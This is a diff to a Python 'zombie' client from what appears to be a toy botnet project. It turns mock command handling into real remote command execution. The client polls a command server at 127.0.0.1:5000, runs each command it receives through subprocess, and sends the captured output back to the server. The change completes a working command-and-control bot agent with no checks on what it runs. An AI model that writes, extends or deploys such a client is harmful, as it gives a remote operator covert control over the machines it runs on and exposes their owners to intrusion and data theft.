@@ -1,9 +1,11 @@
-from urllib.request import urlopen
+from urllib.request import Request, urlopen
 from time import sleep
+import subprocess
+import unicodedata
 
 
 # the number of seconds to between sebsequent requests to the server to fetch a command
-INTER_REQUEST_DELAY = 2
+INTER_REQUEST_DELAY = 4
 
 
 def get_zid_from_server():
@@ -23,6 +25,9 @@ except FileNotFoundError:
         file.write(zid)
 
 
+def remove_control_characters(s):
+    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")
+
 command = ""
 while True:
     print('zombie - main loop')
@@ -35,8 +40,8 @@ while True:
             command = res
             print("assume", command, "is executed.")
             # let's send the result (a mock result) to the responder after 2 seconds.
-            sleep(2)
-            with urlopen("http://127.0.0.1:5000/reportResult/{}/{}/{}".format(zid, command, "mock_response").replace(" ", "%20")) as http_response:
+            completed = subprocess.run(command.split(), stdout=subprocess.PIPE)
+            with urlopen('http://127.0.0.1:5000/reportResult/{}/{}/"{}"'.format(zid, command, remove_control_characters(completed.stdout.decode('utf-8'))).replace(" ", "%20")) as http_response:
                 print(f"status code from server upon uploading command result : {http_response.status}")
                 print("server said", bytes.decode(http_response.read()))
     sleep(INTER_REQUEST_DELAY)
